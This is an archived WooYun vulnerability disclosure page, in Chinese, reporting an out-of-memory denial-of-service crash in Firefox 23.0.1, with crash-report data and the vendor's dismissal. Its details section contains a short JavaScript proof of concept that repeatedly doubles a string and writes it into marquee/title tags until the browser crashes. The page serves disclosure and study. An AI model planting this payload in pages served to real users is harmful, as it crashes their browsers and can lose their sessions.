@@ -1,0 +1,289 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Firefox 23.0.1处理标签内存溢出拒绝服务漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Firefox 23.0.1处理标签内存溢出拒绝服务漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blast">blast</a> 
+</li><li>提交时间：		2013-09-10 17:05</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-15：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-12-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">坑爹的是启动后恢复会话about:sessionretore那儿一碰又卡死了……<br />
+<br />
+D2D? D2D+ DWrite? DWrite+ D3D10 Layers? D3D10 Layers+ xpcom_runtime_abort(###!!! ABORT: OOM: file e:\builds\moz2_slave\rel-m-rel-w32_bld-000000000000\build\xpcom\string\src\nsTSubstring.cpp, line 533)<br />
+<br />
+<br />
+Debug String:<br />
+(JavaScript Error: &quot;allocation size overflow&quot;, Line 5)<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">&lt;script&gt;<br />
+<br />
+function A(){  <br />
+<br />
+var buffer = &#039;\xFF&#039;;<br />
+<br />
+for(i=0;i&lt;26;i++)  //&lt;==崩不掉稍微改大点也可以，我这儿21左右就能崩溃了<br />
+<br />
+{<br />
+<br />
+buffer+=buffer+&#039;\xFF&#039;+&#039;\xFC&#039;;<br />
+<br />
+document.write(&#039;&lt;marquee&gt;&lt;title&gt;&#039;+buffer+buffer);<br />
+<br />
+}  <br />
+<br />
+}<br />
+<br />
+A();<br />
+<br />
+&lt;/script&gt;<br />
+<br />
+<br />
+<br />
+我猜是渲染的那几次GlobalAlloc弄的? </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">挂之前的（19次循环），这时候基本已经快跑到外面来了：<br />
+<br />
+</p><p class="detail"><a href="../images/1016480876b7ca855c42b3c453ee00eeb359f73c.png" target="_blank"><img src="../images/1016480876b7ca855c42b3c453ee00eeb359f73c.png" alt="f1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/10165330eca92c6379ccbe4acab52ff49383632b.png" target="_blank"><img src="../images/10165330eca92c6379ccbe4acab52ff49383632b.png" alt="f3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+再开会话<br />
+<br />
+</p><p class="detail"><a href="../images/1016523688e0a8ce44001af182cee0523ff4cd65.png" target="_blank"><img src="../images/1016523688e0a8ce44001af182cee0523ff4cd65.png" alt="f2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+AdapterDeviceID: 0x0847<br />
+<br />
+AdapterVendorID: 0x10de<br />
+<br />
+Add-ons: %7B9c51bd27-6ed8-4000-a2bf-36cb95c0c947%7D:11.0.1,fiddlerhook%40fiddler2.com:2.4.4.5,layoutPlan%40mozillaonline.com:1.0.2,%7Bea2b95c2-9be8-48ed-bdd1-5fcd2ad0ff99%7D:0.3.8.2,tabimprovelite%40mozillaonline.com:1.7.23.1,firegestures%40xuldev.org:1.7.10,coba%40mozilla.com.cn:1.0.15,cpmanager%40mozillaonline.com:1.0.4,%7B972ce4c6-7e08-4474-a285-3208198ce6fd%7D:23.0.1,jid1-2B1RkgHEZ0DcWA%40jetpack:0.2.1,firebug%40software.joehewitt.com:1.12.1<br />
+<br />
+AvailablePageFile: 2052677632<br />
+<br />
+AvailablePhysicalMemory: 711258112<br />
+<br />
+AvailableVirtualMemory: 1816576000<br />
+<br />
+BuildID: 20130814063812<br />
+<br />
+CrashTime: 1378803057<br />
+<br />
+EMCheckCompatibility: true<br />
+<br />
+InstallTime: 1376813623<br />
+<br />
+Notes: AdapterVendorID: 0x10de, AdapterDeviceID: 0x0847, AdapterSubsysID: 3665103c, AdapterDriverVersion: 9.18.13.1422<br />
+<br />
+D2D? D2D+ DWrite? DWrite+ D3D10 Layers? D3D10 Layers+ <br />
+<br />
+OOMAllocationSize: 402653208<br />
+<br />
+ProductID: {ec8030f7-c20a-464f-9b0e-13a3a9e97384}<br />
+<br />
+ProductName: Firefox<br />
+<br />
+ReleaseChannel: release<br />
+<br />
+SecondsSinceLastCrash: 365<br />
+<br />
+StartupTime: 1378803051<br />
+<br />
+SystemMemoryUsePercentage: 82<br />
+<br />
+Theme: classic/1.0<br />
+<br />
+Throttleable: 1<br />
+<br />
+TotalVirtualMemory: 4294836224<br />
+<br />
+URL: about:blank<br />
+<br />
+Vendor: Mozilla<br />
+<br />
+Version: 23.0.1<br />
+<br />
+Winsock_LSP: MSAFD Tcpip [TCP/IP] : 2 : 1 : %SystemRoot%\system32\mswsock.dll <br />
+<br />
+ MSAFD Tcpip [UDP/IP] : 2 : 2 :  <br />
+<br />
+ MSAFD Tcpip [RAW/IP] : 2 : 3 : %SystemRoot%\system32\mswsock.dll <br />
+<br />
+ MSAFD Tcpip [TCP/IPv6] : 2 : 1 :  <br />
+<br />
+ MSAFD Tcpip [UDP/IPv6] : 2 : 2 : %SystemRoot%\system32\mswsock.dll <br />
+<br />
+ MSAFD Tcpip [RAW/IPv6] : 2 : 3 :  <br />
+<br />
+ RSVP TCPv6 服务提供商 : 2 : 1 : %SystemRoot%\system32\mswsock.dll <br />
+<br />
+ RSVP TCP 服务提供商 : 2 : 1 :  <br />
+<br />
+ RSVP UDPv6 服务提供商 : 2 : 2 : %SystemRoot%\system32\mswsock.dll <br />
+<br />
+ RSVP UDP 服务提供商 : 2 : 2 :  <br />
+<br />
+ VMCI sockets DGRAM : 0 : 2 : %windir%\system32\vsocklib.dll <br />
+<br />
+ VMCI sockets STREAM : 0 : 1 : <br />
+<br />
+<br />
+<br />
+此报告同时包含了应用程序崩溃时状态的技术信息。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">这个…看你们的了… </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blast" title="blast">blast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036684" title="Firefox 23.0.1处理标签内存溢出拒绝服务漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-09-15 17:05</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36684";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
